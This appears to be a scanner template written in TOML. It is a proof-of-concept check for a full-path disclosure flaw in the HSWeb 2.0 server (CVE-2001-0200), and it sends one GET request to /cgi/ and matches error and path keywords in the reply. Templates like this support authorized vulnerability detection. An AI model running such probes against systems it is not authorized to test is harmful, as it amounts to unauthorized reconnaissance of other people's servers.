[info]
author = "ave"
description = "向 HSWeb 2.0 HTTP 服务器的 /cgi/ 目录发送 GET 请求，检测是否返回了服务器物理路径信息（如 Windows 驱动器路径 / Unix 绝对路径 / 目录列表），确认路径泄露漏洞存在。"
id = "POC-AVE-2001-0078"
name = "HSWeb 2.0 全路径泄露漏洞 PoC"
severity = "medium"
tags = ["ave-2001-0078"]
vuln_id = [
    "CVE-2001-0200",
    "AVE-2001-0078",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Error",
    "Exception",
    "path",
    "directory",
    "Traceback",
]
